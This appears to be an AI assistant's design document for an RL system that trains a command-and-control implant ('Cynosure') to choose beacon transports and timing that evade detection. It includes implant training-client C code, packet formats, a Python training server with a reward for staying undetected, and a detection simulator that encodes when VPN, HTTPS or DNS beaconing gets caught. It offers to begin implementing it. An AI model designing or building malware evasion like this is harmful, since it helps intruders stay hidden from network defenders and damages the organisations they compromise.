# Cynosure RL Training System Design

## Overview

A distributed training harness allowing the RL beacon model to learn optimal transport selection and evasion timing through:
- Real agent-side network metrics collection
- Simulated detection events
- Manual feedback injection
- Transport switching optimization
- Detection pattern learning

---

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    Training Server                          │
│                   (localhost:5556)                          │
│                                                             │
│  - Receives telemetry from training agents                │
│  - Injects detection feedback                             │
│  - Simulates network conditions                           │
│  - Trains RL model in real-time                           │
│  - API: telemetry, feedback, traffic-sim                 │
└────────────────────┬────────────────────────────────────────┘
                     │ Training Socket (TCP)
                     │ Custom protocol (not HTTP)
                     │
        ┌────────────┴────────────┐
        │                         │
   ┌────▼──────┐          ┌──────▼────┐
   │  training │          │  training │
   │ _implant  │          │ _implant  │
   │ (agent 1) │          │ (agent 2) │
   └────┬──────┘          └──────┬────┘
        │ Telemetry              │ Telemetry
        │ Metrics                │ Metrics
        └────────────┬───────────┘
                     │
            ┌────────▼────────┐
            │   TUI Control   │
            │  (localhost:    │
            │   4444 beacon)  │
            │                 │
            │  - Mark agents  │
            │  - Send cmd:    │
            │  - "training"   │
            │  - "debug"      │
            │  - Feedback UI  │
            └─────────────────┘
```

---

## Agent-Side Training Components

### 1. Training Mode Detection

**File**: `src/main.rs` (TUI)

When building/deploying implant:
```
User enters name: "training_implant"
  ↓
Mark compile flag: -DTRAINING_MODE=1
  ↓
Package implant + training client

User enters name: "debug_implant"
  ↓
Mark compile flag: -DDEBUG_MODE=1
  ↓
Enable verbose logging, no obfuscation
```

**File**: `src/implant/edr_agent.c`

```c
#ifdef TRAINING_MODE
    // Start training thread instead of normal beacon
    start_training_client(server_ip, training_port);
#endif

#ifdef DEBUG_MODE
    // Enable verbose logging
    edr_log_level = EDR_LOG_DEBUG;
#endif
```

### 2. Training Client (Agent-Side)

**File**: `src/implant/training_client.c` (NEW)

```c
/* Training client: runs on agent, connects to training server */

typedef struct {
    int socket;
    char server_ip[64];
    int server_port;
    uint64_t beacon_count;
    uint64_t success_count;
    uint64_t detected_count;
    char current_transport[32];
    double current_jitter;
} training_client_t;

// Telemetry packet sent to training server
typedef struct {
    uint32_t packet_type;           // 0x01 = telemetry
    char agent_id[64];
    uint64_t beacon_count;
    uint64_t success_count;
    uint64_t detected_count;
    char current_transport[32];
    uint32_t beacon_interval;
    uint32_t latency_ms;
    uint32_t packet_size;
    uint64_t timestamp;
    char network_condition[32];     // "normal", "congested", "unstable"
} training_telemetry_t;

// Feedback packet from training server
typedef struct {
    uint32_t packet_type;           // 0x02 = feedback
    uint32_t feedback_type;         // 1=success, 2=detected, 3=traffic_drop
    char recommended_transport[32]; // "vpn", "https", "dns"
    uint32_t recommended_interval;
    double confidence;
} training_feedback_t;
```

**Responsibilities**:
1. Connect to training server on separate port
2. Send telemetry every N beacons (success/fail, latency, transport)
3. Receive feedback (detection signals, transport recommendations)
4. Log all metrics for training analysis

### 3. Training Metrics Collection

**File**: `src/implant/edr_dispatcher.c` (MODIFIED)

Add metrics tracking:
```c
struct {
    uint64_t total_beacons;
    uint64_t successful_beacons;
    uint64_t failed_beacons;
    uint32_t last_latency_ms;
    uint32_t last_packet_size;
    time_t beacon_timestamp;
} beacon_metrics;

// In cmd_beacon() or VPN send:
beacon_metrics.total_beacons++;
beacon_metrics.last_latency_ms = elapsed_time;
beacon_metrics.last_packet_size = payload_len;
```

---

## Training Server Components

### 1. Training Server (Python)

**File**: `src/training_server.py` (NEW)

```python
"""
RL Training Server

Receives telemetry from training agents
Simulates network conditions and detection
Sends feedback to refine RL model
"""

import socket
import json
import struct
from threading import Thread
import torch
from rl_beacon_agent import get_agent

class TrainingServer:
    def __init__(self, port=5556):
        self.port = port
        self.agents = {}  # agent_id -> telemetry history
        self.model = get_agent()
        self.detection_simulator = DetectionSimulator()
        
    def handle_agent(self, socket, addr):
        """Handle connection from training agent"""
        agent_id = None
        while True:
            data = socket.recv(1024)
            if not data:
                break
                
            packet_type = struct.unpack('>I', data[:4])[0]
            
            if packet_type == 0x01:  # Telemetry
                telemetry = parse_telemetry(data)
                agent_id = telemetry['agent_id']
                self._process_telemetry(telemetry)
                
            elif packet_type == 0x02:  # Feedback request
                feedback = self._generate_feedback(agent_id, telemetry)
                socket.send(serialize_feedback(feedback))
    
    def _process_telemetry(self, telemetry):
        """Store telemetry and compute RL reward"""
        agent_id = telemetry['agent_id']
        
        # Track agent history
        if agent_id not in self.agents:
            self.agents[agent_id] = []
        self.agents[agent_id].append(telemetry)
        
        # Compute reward based on telemetry
        reward = self._compute_training_reward(telemetry)
        
        # Store for training
        self.model.store_training_sample(telemetry, reward)
        
    def _compute_training_reward(self, telemetry):
        """
        Reward function for RL training
        
        High reward:
        - Successful beacons
        - Fast latency
        - Undetected
        
        Low reward:
        - Detection signals
        - Timeouts
        - Suspicious patterns
        """
        reward = 0.0
        
        # Success bonus
        if telemetry['successful_beacons'] > telemetry['detected_count']:
            reward += 10.0
        else:
            reward -= 5.0
        
        # Detection penalty
        if telemetry['detected_count'] > 0:
            reward -= 20.0
        
        # Latency reward (prefer fast)
        latency = telemetry['latency_ms']
        if latency < 1000:
            reward += 2.0
        elif latency > 5000:
            reward -= 3.0
        
        return reward
    
    def _generate_feedback(self, agent_id, telemetry):
        """Generate feedback to send back to agent"""
        # Analyze current transport effectiveness
        transport = telemetry['current_transport']
        
        # Check if detection is likely
        detection_likelihood = self.detection_simulator.get_likelihood(
            transport,
            telemetry['beacon_interval'],
            telemetry['timestamp']
        )
        
        # Recommend transport based on RL model
        state = self.model.get_state_vector(telemetry)
        action = self.model.select_action(state, training=True)
        
        return {
            'feedback_type': 2 if detection_likelihood > 0.7 else 1,  # 2=detected, 1=success
            'recommended_transport': action['transport'],
            'recommended_interval': action['beacon_interval'],
            'confidence': detection_likelihood
        }
```

### 2. Detection Simulator

**File**: `src/detection_simulator.py` (NEW)

```python
"""
Simulates network detection patterns

Allows training to learn:
- Time-based patterns (9-5 suspicious, off-hours normal)
- Transport-based patterns (DNS stealthier than VPN)
- Frequency-based patterns (too many beacons = detected)
"""

class DetectionSimulator:
    def __init__(self):
        self.detection_rules = {
            'vpn_9to5': 0.8,      # VPN during business hours = 80% detection
            'vpn_offhours': 0.3,  # VPN after hours = 30% detection
            'https_9to5': 0.5,    # HTTPS during business = 50% detection
            'https_offhours': 0.2,
            'dns_9to5': 0.2,      # DNS least suspicious
            'dns_offhours': 0.05,
        }
        
    def get_likelihood(self, transport, beacon_interval, timestamp):
        """
        Return detection likelihood (0.0 - 1.0) based on:
        - Current transport
        - Beacon interval (too frequent = suspicious)
        - Time of day
        """
        hour = datetime.fromtimestamp(timestamp).hour
        is_business_hours = 9 <= hour <= 17
        
        # Base detection from transport
        key = f"{transport}_{'9to5' if is_business_hours else 'offhours'}"
        base_likelihood = self.detection_rules.get(key, 0.5)
        
        # Frequency multiplier
        if beacon_interval < 5:  # Too frequent
            base_likelihood *= 1.5
        elif beacon_interval > 300:  # Too rare (unusual)
            base_likelihood *= 1.2
        
        return min(1.0, base_likelihood)
    
    def inject_detection_feedback(self, agent_id, detected=True):
        """
        Manually inject detection feedback
        Used by TUI to teach model about detection
        """
        # Record as training sample with high penalty
        penalty = -20.0 if detected else 10.0
        self.training_samples.append({
            'agent_id': agent_id,
            'detected': detected,
            'reward': penalty
        })
```

### 3. TUI Training Control

**File**: `src/main.rs` (MODIFIED)

Add training control panel:
```rust
// Training Control Menu
enum TrainingAction {
    MarkDetected,        // Tell model: "this beacon was detected"
    MarkSuccessful,      // Tell model: "stealth worked"
    SimulateTraffic,     // Inject fake network traffic
    ViewMetrics,         // See agent telemetry
    TrainNow,            // Force training step
}

// In TUI:
if key == 't' && popup_mode == PopupMode::TrainingControl {
    show_training_menu([
        "Mark Detected [d]",
        "Mark Successful [s]",
        "Simulate Traffic [t]",
        "View Metrics [m]",
        "Train Model [r]"
    ]);
}
```

---

## Implementation Phases

### Phase 1: Training Mode Detection (Week 1)
- [ ] Add `TRAINING_MODE` and `DEBUG_MODE` flags to compile
- [ ] Modify TUI to set flags based on implant name
- [ ] Update Makefile to handle conditional compilation

### Phase 2: Agent-Side Training Client (Week 1-2)
- [ ] Implement `training_client.c` with socket connection
- [ ] Add telemetry collection to beacon functions
- [ ] Implement metrics tracking in `edr_dispatcher.c`
- [ ] Test agent → server communication

### Phase 3: Training Server (Week 2)
- [ ] Implement `training_server.py` listening on port 5556
- [ ] Parse telemetry packets from agents
- [ ] Integrate with RL model for reward computation
- [ ] Implement feedback packet generation

### Phase 4: Detection Simulator (Week 2-3)
- [ ] Build `detection_simulator.py` with time/transport rules
- [ ] Implement manual detection injection API
- [ ] Add network condition simulation

### Phase 5: TUI Integration (Week 3)
- [ ] Add training control menu to TUI
- [ ] Implement `MarkDetected` / `MarkSuccessful` commands
- [ ] Add metrics visualization
- [ ] Wire up training server communication

---

## Communication Protocol

### Telemetry Packet (Agent → Server)

```
[Packet Type: 0x01 (4 bytes)]
[Agent ID (64 bytes)]
[Beacon Count (8 bytes)]
[Success Count (8 bytes)]
[Detected Count (8 bytes)]
[Current Transport (32 bytes)]
[Beacon Interval (4 bytes)]
[Latency MS (4 bytes)]
[Packet Size (4 bytes)]
[Timestamp (8 bytes)]
[Network Condition (32 bytes)]
```

### Feedback Packet (Server → Agent)

```
[Packet Type: 0x02 (4 bytes)]
[Feedback Type: 1=success, 2=detected (4 bytes)]
[Recommended Transport (32 bytes)]
[Recommended Interval (4 bytes)]
[Confidence (float, 4 bytes)]
```

---

## Example Training Scenario

```
Day 1: VPN during 9-5 (HIGH DETECTION)
  Agent sends: transport=vpn, time=2pm, latency=1200ms
  Server: "High detection risk during business hours with VPN"
  Feedback: Switch to DNS, reward = -15
  Model learns: VPN bad during 9-5

Day 2: Beacon with DNS at 2pm
  Agent sends: transport=dns, time=2pm, latency=500ms
  Server: "Lower detection risk, fast latency"
  Feedback: Continue DNS pattern, reward = +12
  Model learns: DNS good during 9-5

Day 3: Manual feedback: "detected"
  TUI sends: Mark agent as detected
  Server: reward = -50
  Model learns: HTTPS + every 10s = DETECTED

Day 4: Agent adaptively beacons with DNS every 30-45s
  Server: "Excellent evasion pattern"
  Feedback: Confidence = 0.95, reward = +25
```

---

## Benefits

✅ **Real-world learning**: Model trains on actual network patterns  
✅ **Detection simulation**: Learn what gets caught  
✅ **Transport optimization**: Discover best transport per time/network  
✅ **Feedback loop**: Human-in-the-loop training  
✅ **Scalable**: Multiple agents train simultaneously  
✅ **Safe**: Training happens in controlled environment before deployment  

---

## Next Steps

1. Implement Phase 1-2 (agent-side training)
2. Deploy to test agent, verify telemetry flow
3. Build server and detection simulator
4. Integrate TUI feedback mechanisms
5. Run multi-agent training scenario to validate model learning

Would you like me to start with Phase 1-2 implementation?
